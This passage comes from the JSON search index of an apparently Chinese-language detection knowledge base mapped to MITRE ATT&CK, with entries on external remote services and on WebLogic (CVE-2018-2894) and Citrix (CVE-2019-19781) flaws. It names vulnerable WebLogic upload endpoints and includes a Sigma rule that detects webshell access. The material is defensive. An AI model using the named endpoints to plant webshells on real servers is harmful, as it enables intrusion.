VPN\uff0cCitrix\u548c\u5176\u4ed6\u8bbf\u95ee\u673a\u5236\u7b49\u8fdc\u7a0b\u670d\u52a1\u4f7f\u7528\u6237\u53ef\u4ee5\u4ece\u5916\u90e8\u4f4d\u7f6e\u8fde\u63a5\u5230\u5185\u90e8\u4f01\u4e1a\u7f51\u7edc\u8d44\u6e90\u3002\u7ecf\u5e38\u6709\u8fdc\u7a0b\u670d\u52a1\u7f51\u5173\u7ba1\u7406\u8fd9\u4e9b\u670d\u52a1\u7684\u8fde\u63a5\u548c\u51ed\u636e\u8eab\u4efd\u9a8c\u8bc1\u3002Windows Remote Management\u7b49\u670d\u52a1\u4e5f\u53ef\u4ee5\u5728\u5916\u90e8\u4f7f\u7528\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fdc\u7a0b\u670d\u52a1\u6765\u83b7\u5f97\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c\u5728\u7f51\u5185\u7528\u4f5c\u6301\u4e45\u5316\u3002\u901a\u5e38\u9700\u8981\u8bbf\u95ee\u6709\u6548\u5e10\u6237\u624d\u80fd\u4f7f\u7528\u8be5\u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7\u51ed\u636e\u7be1\u6539\u6216\u5728\u8fdb\u5165\u4f01\u4e1a\u7f51\u7edc\u4e4b\u540e\u4ece\u7528\u6237\u90a3\u91cc\u83b7\u53d6\u51ed\u636e\u6765\u83b7\u5f97\u6b64\u6743\u9650\u3002\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u4ee5\u5c06\u5bf9\u8fdc\u7a0b\u670d\u52a1\u7684\u8bbf\u95ee\u7528\u4f5c\u5197\u4f59\u8bbf\u95ee\u7684\u4e00\u90e8\u5206\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6309\u7167MITRE\u5b98\u65b9\u793a\u4f8b\uff0c\u50cfVPN\u3001\u8fdc\u7a0b\u684c\u9762\u3001SSH\u7b49\u90fd\u53ef\u4ee5\u5c5e\u4e8eT1133\u5916\u90e8\u8fdc\u7a0b\u8bbf\u95ee\u3002 \u68c0\u6d4b\u65e5\u5fd7 SSH\u65e5\u5fd7\u3001VPN\u65e5\u5fd7\u3001\u8fdc\u7a0b\u684c\u9762\u767b\u5f55\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u9075\u5faa\u6700\u4f73\u5b9e\u8df5\u6765\u68c0\u6d4b\u653b\u51fb\u8005\u5bf9\u6709\u6548\u5e10\u6237\u7684\u4f7f\u7528\uff0c\u4ee5\u5bf9\u8fdc\u7a0b\u670d\u52a1\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u6536\u96c6\u8eab\u4efd\u9a8c\u8bc1\u65e5\u5fd7\u5e76\u5206\u6790\u5f02\u5e38\u8bbf\u95ee\u6a21\u5f0f\uff0c\u6d3b\u52a8\u7a97\u53e3\u4ee5\u53ca\u6b63\u5e38\u5de5\u4f5c\u65f6\u95f4\u4e4b\u5916\u7684\u8bbf\u95ee\u3002 \u901a\u8fc7VPN\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u653b\u51fb\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u6848\u4f8b\uff0c\u4e0d\u5728\u4e00\u4e00\u63cf\u8ff0\u3002\u53ef\u5229\u7528\u7528\u6237\u8d26\u6237\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002\u8fdc\u7a0b\u684c\u9762\u3001SSH\u4e5f\u53ef\u6839\u636e\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1133 https://attack.mitre.org/techniques/T1133/","title":"T1133-\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#t1133-","text":"","title":"T1133-\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#attck","text":"VPN\uff0cCitrix\u548c\u5176\u4ed6\u8bbf\u95ee\u673a\u5236\u7b49\u8fdc\u7a0b\u670d\u52a1\u4f7f\u7528\u6237\u53ef\u4ee5\u4ece\u5916\u90e8\u4f4d\u7f6e\u8fde\u63a5\u5230\u5185\u90e8\u4f01\u4e1a\u7f51\u7edc\u8d44\u6e90\u3002\u7ecf\u5e38\u6709\u8fdc\u7a0b\u670d\u52a1\u7f51\u5173\u7ba1\u7406\u8fd9\u4e9b\u670d\u52a1\u7684\u8fde\u63a5\u548c\u51ed\u636e\u8eab\u4efd\u9a8c\u8bc1\u3002Windows Remote Management\u7b49\u670d\u52a1\u4e5f\u53ef\u4ee5\u5728\u5916\u90e8\u4f7f\u7528\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fdc\u7a0b\u670d\u52a1\u6765\u83b7\u5f97\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c\u5728\u7f51\u5185\u7528\u4f5c\u6301\u4e45\u5316\u3002\u901a\u5e38\u9700\u8981\u8bbf\u95ee\u6709\u6548\u5e10\u6237\u624d\u80fd\u4f7f\u7528\u8be5\u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7\u51ed\u636e\u7be1\u6539\u6216\u5728\u8fdb\u5165\u4f01\u4e1a\u7f51\u7edc\u4e4b\u540e\u4ece\u7528\u6237\u90a3\u91cc\u83b7\u53d6\u51ed\u636e\u6765\u83b7\u5f97\u6b64\u6743\u9650\u3002\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u4ee5\u5c06\u5bf9\u8fdc\u7a0b\u670d\u52a1\u7684\u8bbf\u95ee\u7528\u4f5c\u5197\u4f59\u8bbf\u95ee\u7684\u4e00\u90e8\u5206\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_1","text":"\u6309\u7167MITRE\u5b98\u65b9\u793a\u4f8b\uff0c\u50cfVPN\u3001\u8fdc\u7a0b\u684c\u9762\u3001SSH\u7b49\u90fd\u53ef\u4ee5\u5c5e\u4e8eT1133\u5916\u90e8\u8fdc\u7a0b\u8bbf\u95ee\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_2","text":"SSH\u65e5\u5fd7\u3001VPN\u65e5\u5fd7\u3001\u8fdc\u7a0b\u684c\u9762\u767b\u5f55\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_5","text":"\u9075\u5faa\u6700\u4f73\u5b9e\u8df5\u6765\u68c0\u6d4b\u653b\u51fb\u8005\u5bf9\u6709\u6548\u5e10\u6237\u7684\u4f7f\u7528\uff0c\u4ee5\u5bf9\u8fdc\u7a0b\u670d\u52a1\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u6536\u96c6\u8eab\u4efd\u9a8c\u8bc1\u65e5\u5fd7\u5e76\u5206\u6790\u5f02\u5e38\u8bbf\u95ee\u6a21\u5f0f\uff0c\u6d3b\u52a8\u7a97\u53e3\u4ee5\u53ca\u6b63\u5e38\u5de5\u4f5c\u65f6\u95f4\u4e4b\u5916\u7684\u8bbf\u95ee\u3002 \u901a\u8fc7VPN\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u653b\u51fb\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u6848\u4f8b\uff0c\u4e0d\u5728\u4e00\u4e00\u63cf\u8ff0\u3002\u53ef\u5229\u7528\u7528\u6237\u8d26\u6237\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002\u8fdc\u7a0b\u684c\u9762\u3001SSH\u4e5f\u53ef\u6839\u636e\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_6","text":"MITRE-ATT&CK-T1133 https://attack.mitre.org/techniques/T1133/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/","text":"T1190-CVE-2018-2894-Weblogic\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u68c0\u6d4b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b Weblogic\u7ba1\u7406\u7aef\u672a\u6388\u6743\u7684\u4e24\u4e2a\u9875\u9762\u5b58\u5728\u4efb\u610f\u4e0a\u4f20jsp\u6587\u4ef6\u6f0f\u6d1e\uff0c\u8fdb\u800c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002 Oracle 7\u6708\u66f4\u65b0\u4e2d\uff0c\u4fee\u590d\u4e86Weblogic Web Service Test Page\u4e2d\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0cWeb Service Test Page \u5728 \u2018\u751f\u4ea7\u6a21\u5f0f\u2019 \u4e0b\u9ed8\u8ba4\u4e0d\u5f00\u542f\uff0c\u6240\u4ee5\u8be5\u6f0f\u6d1e\u6709\u4e00\u5b9a\u9650\u5236\u3002\u4e24\u4e2a\u9875\u9762\u5206\u522b\u4e3a/ws_utc/begin.do\u3001/ws_utc/config.do\u3002 \u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a weblogic 10.3.6.0\u3001weblogic 12.1.3.0\u3001weblogic 12.2.1.2\u3001weblogic 12.2.1.3\u3002 \u68c0\u6d4b\u65e5\u5fd7 HTTP.log \u6d4b\u8bd5\u590d\u73b0 \u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a Weblogic\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08CVE-2018-2894\uff09\u590d\u73b0 https://blog.csdn.net/weixin_43625577/article/details/97001677 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5\u3002\u76f4\u63a5\u5f15\u7528\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\u4e2d\u7684\u6848\u4f8b\u6570\u636e\u8fdb\u884c\u7279\u5f81\u63d0\u53d6\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 \u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 title: Oracle WebLogic\u6f0f\u6d1e\u5229\u7528Z description: \u68c0\u6d4b\u5bf9\u653e\u5165WebLogic\u670d\u52a1\u5668\u4e0a\u5bc6\u94a5\u5e93\u6587\u4ef6\u5939\u4e2d\u7684webshell\u7684\u8bbf\u95ee author: Florian Roth translator: 12306Bro date: 2018/07/22 modified: 2020/03/14 status: experimental references: - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-2894 - https://blog.csdn.net/weixin_43625577/article/details/97001677 logsource: category: webserver detection: selection: c-uri: - '*/config/keystore/*.js*' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ Weblogic\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08CVE-2018-2894\uff09\u590d\u73b0 https://blog.csdn.net/weixin_43625577/article/details/97001677","title":"T1190-CVE-2018-2894-Weblogic\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#t1190-cve-2018-2894-weblogic","text":"","title":"T1190-CVE-2018-2894-Weblogic\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_1","text":"Weblogic\u7ba1\u7406\u7aef\u672a\u6388\u6743\u7684\u4e24\u4e2a\u9875\u9762\u5b58\u5728\u4efb\u610f\u4e0a\u4f20jsp\u6587\u4ef6\u6f0f\u6d1e\uff0c\u8fdb\u800c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002 Oracle 7\u6708\u66f4\u65b0\u4e2d\uff0c\u4fee\u590d\u4e86Weblogic Web Service Test Page\u4e2d\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0cWeb Service Test Page \u5728 \u2018\u751f\u4ea7\u6a21\u5f0f\u2019 \u4e0b\u9ed8\u8ba4\u4e0d\u5f00\u542f\uff0c\u6240\u4ee5\u8be5\u6f0f\u6d1e\u6709\u4e00\u5b9a\u9650\u5236\u3002\u4e24\u4e2a\u9875\u9762\u5206\u522b\u4e3a/ws_utc/begin.do\u3001/ws_utc/config.do\u3002 \u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a weblogic 10.3.6.0\u3001weblogic 12.1.3.0\u3001weblogic 12.2.1.2\u3001weblogic 12.2.1.3\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_2","text":"HTTP.log","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_3","text":"\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a Weblogic\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08CVE-2018-2894\uff09\u590d\u73b0 https://blog.csdn.net/weixin_43625577/article/details/97001677","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_4","text":"\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5\u3002\u76f4\u63a5\u5f15\u7528\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\u4e2d\u7684\u6848\u4f8b\u6570\u636e\u8fdb\u884c\u7279\u5f81\u63d0\u53d6\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#sigma","text":"\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 title: Oracle WebLogic\u6f0f\u6d1e\u5229\u7528Z description: \u68c0\u6d4b\u5bf9\u653e\u5165WebLogic\u670d\u52a1\u5668\u4e0a\u5bc6\u94a5\u5e93\u6587\u4ef6\u5939\u4e2d\u7684webshell\u7684\u8bbf\u95ee author: Florian Roth translator: 12306Bro date: 2018/07/22 modified: 2020/03/14 status: experimental references: - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-2894 - https://blog.csdn.net/weixin_43625577/article/details/97001677 logsource: category: webserver detection: selection: c-uri: - '*/config/keystore/*.js*' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical","title":"Sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_7","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ Weblogic\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08CVE-2018-2894\uff09\u590d\u73b0 https://blog.csdn.net/weixin_43625577/article/details/97001677","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/","text":"T1190-CVE-2019-19781\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b Citrix\u65d7\u4e0b\u591a\u6b3e\u4ea4\u4ed8\u63a7\u5236\u5668\u548c\u7f51\u5173\u5b58\u5728RCE\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5728\u65e0\u9700\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\u5c31\u53ef\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u6839\u636e\u5176\u4ed6\u5b89\u5168\u7f51\u7ad9\u7684\u8bf4\u6cd5\uff0c\u8fd9\u4e2aRCE\u6f0f\u6d1e\u4f1a\u6709\u4e00\u4e2a\u6807\u8bb0\u6f0f\u6d1e\uff08\u5176\u4e2d\u4e4b\u4e00\u7684\u6807\u8bb0\uff09\uff0c\u5373\u672c\u6b21\u62a5\u9053\u7684Citrx\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff08CVE-2019-19781\uff09\u3002Citrx\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff08CVE-2019-19781\uff09\u5229\u7528\u65b9\u5f0f\u7684PoC\u5df2\u88ab\u516c\u5f00\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u590d\u6742\u6027\u4f4e\uff0c\u4e14\u65e0\u6743\u9650\u8981\u6c42\uff0c\u653b\u51fb\u8005\u53ea\u80fd\u904d\u5386vpns\u6587\u4ef6\u5939\uff0c\u4f46\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528Citrx\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\